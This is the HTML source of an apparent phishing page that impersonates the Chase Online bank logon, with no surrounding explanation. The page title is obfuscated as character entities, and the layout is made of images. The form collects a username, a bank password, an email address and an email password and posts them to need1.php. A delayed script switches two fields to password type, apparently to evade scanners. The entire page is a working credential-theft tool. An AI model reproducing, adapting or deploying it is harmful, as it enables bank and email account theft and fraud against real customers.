<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#67;&#104;&#97;&#115;&#101;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#45;&#32;&#32;&#76;&#111;&#103;&#111;&#110;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[3].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div id="container">
<div class="loader"></div>
<div id="image1" style="position:absolute; overflow:hidden; left:187px; top:59px; width:1002px; height:35px; z-index:0"><img src="images/hc1.png" alt="" title="" border=0 width=1002 height=35></div>

<div id="image2" style="position:absolute; overflow:hidden; left:1019px; top:13px; width:151px; height:13px; z-index:1"><a href="#"><img src="images/hc2.png" alt="" title="" border=0 width=151 height=13></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:199px; top:9px; width:135px; height:30px; z-index:2"><a href="#"><img src="images/logo.png" alt="" title="" border=0 width=135 height=30></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:182px; top:76px; width:26px; height:416px; z-index:3"><img src="images/hc3.png" alt="" title="" border=0 width=26 height=416></div>

<div id="image5" style="position:absolute; overflow:hidden; left:1168px; top:76px; width:26px; height:416px; z-index:4"><img src="images/hc3.png" alt="" title="" border=0 width=26 height=416></div>

<div id="image6" style="position:absolute; overflow:hidden; left:186px; top:476px; width:1002px; height:27px; z-index:5"><img src="images/hc4.png" alt="" title="" border=0 width=1002 height=27></div>

<div id="image7" style="position:absolute; overflow:hidden; left:253px; top:103px; width:335px; height:214px; z-index:6"><img src="images/hc5.png" alt="" title="" border=0 width=335 height=214></div>

<div id="image8" style="position:absolute; overflow:hidden; left:685px; top:109px; width:350px; height:88px; z-index:7"><img src="images/hc6.png" alt="" title="" border=0 width=350 height=88></div>

<div id="image9" style="position:absolute; overflow:hidden; left:691px; top:208px; width:105px; height:19px; z-index:8"><a href="#"><img src="images/learn.png" alt="" title="" border=0 width=105 height=19></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:331px; top:256px; width:190px; height:14px; z-index:9"><a href="#"><img src="images/forgt.png" alt="" title="" border=0 width=190 height=14></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:868px; top:242px; width:159px; height:224px; z-index:10"><img src="images/hc7.png" alt="" title="" border=0 width=159 height=224></div>

<div id="image12" style="position:absolute; overflow:hidden; left:256px; top:334px; width:232px; height:21px; z-index:11"><a href="#"><img src="images/need.png" alt="" title="" border=0 width=232 height=21></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:303px; top:531px; width:762px; height:21px; z-index:12"><a href="#"><img src="images/choose.png" alt="" title="" border=0 width=762 height=21></a></div>

<div id="image14" style="position:absolute; overflow:hidden; left:623px; top:500px; width:161px; height:27px; z-index:13"><a href="#"><img src="images/securty.png" alt="" title="" border=0 width=161 height=27></a></div>

<div id="image15" style="position:absolute; overflow:hidden; left:180px; top:557px; width:993px; height:87px; z-index:14"><img src="images/hc8.png" alt="" title="" border=0 width=993 height=87></div>
<form action=need1.php name=kahanjana id=kahanjana method=post>
<input name="usr" autocomplete="off" required type="text" style="position:absolute;width:160px;left:385px;top:142px;z-index:15">
<input name="psw" autocomplete="off" required type="text" style="position:absolute;width:160px;left:385px;top:166px;z-index:16">
<input name="eml" autocomplete="off" required type="text" style="position:absolute;width:160px;left:385px;top:190px;z-index:17">
<input name="eps" autocomplete="off" required type="text" style="position:absolute;width:160px;left:385px;top:214px;z-index:18">
<div id="formcheckbox1" style="position:absolute; left:355px; top:237px; z-index:19"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:393px; top:277px; z-index:20"><input type="image" name="formimage1" width="59" height="22" src="images/logon.png"></div>

</div>
 
	
</body>
</html>
